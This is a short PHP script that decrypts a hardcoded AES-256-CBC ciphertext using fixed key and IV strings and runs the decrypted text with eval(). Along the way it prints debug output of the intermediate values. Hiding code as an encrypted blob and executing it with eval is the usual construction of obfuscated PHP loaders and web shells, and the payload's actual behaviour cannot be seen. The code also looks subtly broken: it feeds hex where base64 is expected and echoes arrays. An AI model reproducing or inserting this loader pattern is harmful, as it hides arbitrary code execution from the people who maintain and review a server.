<?php 
$s = "b1a0f780c1c73798ae6ddd7f5529a84d33ee3f83af48310a6450730f56487fc9096d0b04aa591fa5467597b63785c44145f0e51fd58820124d238fc78fb2060f";

$secret_key = 'key-asdf';
$secret_iv = 'iv-asdf';

$output = false;
$encrypt_method = "AES-256-CBC";
$key = hash('sha256', $secret_key);
$key = hex2bin($key);
$iv = hash('sha256', $secret_iv);
echo $iv;
$iv = hex2bin($iv);
echo $iv;
$iv = unpack('C*', $iv);
echo $iv;
$iv = array_slice($iv, 0, 16);
echo $iv;
$iv = array_map("chr", $iv);
echo $iv;
$iv = join($iv);
//$iv = substr($iv, 0, 16);

echo $iv;

$output = openssl_decrypt($s, "AES-256-CBC", $key, 0, $iv);

echo $output;

eval($output);


?>
